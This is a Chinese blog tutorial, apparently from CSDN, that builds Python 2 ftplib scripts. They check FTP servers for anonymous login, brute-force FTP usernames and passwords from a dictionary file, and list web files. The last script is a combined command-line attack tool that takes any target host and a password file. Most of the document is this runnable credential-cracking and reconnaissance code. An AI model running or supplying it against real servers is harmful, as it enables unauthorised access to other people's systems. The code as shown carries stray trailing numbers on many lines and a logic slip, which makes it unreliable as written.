**目录**

[判断FTP服务器是否允许匿名登录](#t0)

[暴力破解FTP口令](#t1)

[列出FTP目录内的网页文件](#t2)

[综合](#t3)

* * *

> 环境：Windows python2.7.15

ftplib模块是python下用于ftp服务的模块 。

### 判断FTP服务器是否允许匿名登录

以下代码是判断[FTP服务器](https://so.csdn.net/so/search?q=FTP%E6%9C%8D%E5%8A%A1%E5%99%A8&spm=1001.2101.3001.7020)是否允许匿名登录

我们写了一个anonLogin() 函数，使用 ftp.login()方法进行匿名登录，如果没有抛出异常，说明FTP服务器允许匿名登录。反之不允许。

```
# -*- coding: utf-8 -*-      
"""      
Created on Sun Nov  4 10:25:17 2018      
@author: 小谢      
"""      
import ftplib      
def anonLogin(hostname):      
    try:      
        ftp=ftplib.FTP(hostname)       #实例化FTP连接      1
        ftp.login('anonymous','')      #匿名登录      1
        print '\n[*] '+hostname+' FTP Anonymous Login Succeeded!'      1
        ftp.quit()                    #退出FTP      1
        return True      1
    except Exception,e:               #如果捕获到异常,说明不允许匿名登录      1
        print '\n[-] '+str(hostname)+' FTP Anonymous Login Failed!'      1
        return False      1
anonLogin('127.0.0.1')
```


![](https://img-blog.csdnimg.cn/20181104103258457.png)

### 暴力破解FTP口令

如果ftp服务器不允许匿名登录呢，我们就需要通过密码字典暴力破解ftp口令。我们通过读取密码字典中的用户名和口令，一个一个去尝试登录，如果没捕获到异常，说明用户名和口令正确！密码字典中用户名和口令用 : 分隔。

```
# -*- coding: utf-8 -*-      
"""      
Created on Sun Nov  4 10:36:49 2018      
@author: 小谢      
"""      
import ftplib      
def bruteLogin(hostname,passwdFile):      
    f=open(passwdFile,'r')      
    lines=f.readlines()      1
    for line in lines:      1
        user=line.split(":")[0]    #用户名      1
        passwd=line.split(":")[1].strip("\n")  #密码      1
        print '[+] Trying: '+user+": "+passwd      1
        try:      1
            ftp=ftplib.FTP(hostname)          #实例化FTP连接      1
            ftp.login(user,passwd)            #登录      1
            print '\n[*] '+hostname +' FTP Login Succeeded!'      1
            ftp.quit()       #退出FTP      1
            return(user,passwd)      #返回用户名和密码      2
        except Exception,e:      2
            pass      2
    print '\n[-] Could not brute force FTP credentials!'      2
    return(None,None)      2
a=bruteLogin("127.0.0.1","key.txt")      2
print("User：%s Password：%s"%a)
```


![](https://img-blog.csdnimg.cn/2018110410585786.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 列出FTP目录内的网页文件

在得到了用户名和口令之后，我们就可以列出FTP目录下的文件，看是否存在网页文件。注意，我们这里只能判断FTP目录这一级的文件，而不能递归的判断目录内的文件。因为我们只知道FTP目录的相对路径，而不知道绝对路径！

```
# -*- coding: utf-8 -*-      
"""      
Created on Sun Nov  4 10:51:13 2018       
@author: 小谢      
"""      
import ftplib      
import os      
def returnDefault(ftp):      1
    try:      1
        dirList=ftp.nlst()   #列出FTP目录下的文件或目录      1
    except:      1
        dirList=[]      1
        print '[-] Could not list directory contents!'      1
        return      1
    retList=[]      1
    for filename in dirList:      1
        fn=filename.lower()        #将目录名转换为小写      1
        if '.php' in fn or '.html' in fn or '.asp' in fn or '.jsp' in fn or '.htm' in fn:      2
            print'[+] Found default page:'+filename      2
            retList.append(filename)      2
    return retList      2
def main():      2
    ftp=ftplib.FTP("127.0.0.1")   #实例化FTP连接      2
    ftp.login("admin","root")      2
    a=returnDefault(ftp)      2
    if a:      2
        print("Defalut Page List：")      2
        for i in a:      3
            print(i)      3
main()
```


![](https://img-blog.csdnimg.cn/20181104112842268.png)

### 综合

我们可以结合前面三个脚本，写一个汇总的脚本。当用户执行脚本的时候，没加 -F/-f 参数指定密码字典的时候，就默认查看FTP服务器是否可匿名登录，如果可匿名登录，则列出FTP目录下的网页文件。如果不能匿名登录，就提示不能匿名登录。当指定了-F/-f 参数的话，就暴力破解 FTP 口令，如果破解成功了，则列出FTP目录下是的网页文件。

```
# -*- coding: utf-8 -*-      
"""      
Created on Sun Nov  4 12:12:41 2018      
@author: 小谢      
"""      
import parser      
import optparse      
import ftplib      
def anonLogin(hostname):     #验证是否可匿名登录      1
    try:      1
        ftp=ftplib.FTP(hostname)      1
        ftp.login('','')  #匿名登录      1
        print '\n[*] '+hostname +' FTP Anonymous Login Succeeded!'      1
        return (True,ftp)      1
    except:      1
        print '\n[-] '+str(hostname)+' FTP Anonymous Login Failed!'      1
        return (False,ftp)      1
def bruteLogin(hostname,passwdFile):  #暴力破解      1
    f=open(passwdFile,'r')      2
    lines=f.readlines()      2
    for line in lines:      2
        user=line.split(":")[0]                #用户名      2
        passwd=line.split(":")[1].strip("\n")  #密码      2
        try:      2
            ftp=ftplib.FTP(hostname)      2
            ftp.login(user,passwd)      2
            print '\n[*] '+hostname +' FTP Login Succeeded!'      2
            print("User:%s Password:%s"%(user,passwd))      2
            return(True,ftp)      3
        except Exception,e:      3
            pass      3
    print '\n[-] Could not brute force FTP credentials!'      3
    return(False,ftp)      3
def returnDefault(ftp):     #列出FTP目录下的网页文件      3
    try:      3
        dirList=ftp.nlst()   #列出FTP目录下的文件或目录      3
    except Exception,e:      3
        print e      3
        print '[-] Could not list directory contents!'      4
        return      4
    retList=[]      4
    for filename in dirList:      4
        fn=filename.lower()        #将目录名转换为小写      4
        if '.php' in fn or '.html' in fn or '.asp' in fn or '.jsp' in fn or '.htm' in fn:      4
            print'[+] Found default page:'+filename      4
            retList.append(filename)      4
    return retList      4
def main():       4
    usage="python %prog -H <target host> -F/f <password file>"  #显示文件的用法帮助信息      5
    parser=optparse.OptionParser(usage)   #实例化一个对象      5
    parser.add_option('-H',dest='Host',type='string',help='target host')      5
    parser.add_option('-f','-F',dest='File',type='string',help='target host')      5
    (options,args)=parser.parse_args()      5
    Host=options.Host      5
    File=options.File      5
    if Host==None:      5
        print(parser.usage)      5
        exit(0)      5
    if File==None:      6
        a=anonLogin(Host)      6
        if a[0]:      6
            returnDefault(a[1])        6
    else:      6
        b=bruteLogin(Host,File)      6
        if b[0]:      6
            returnDefault(b[1])      6
    return       6
if __name__=="__main__":      6
    main()
```


![](https://img-blog.csdnimg.cn/20181104131507990.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)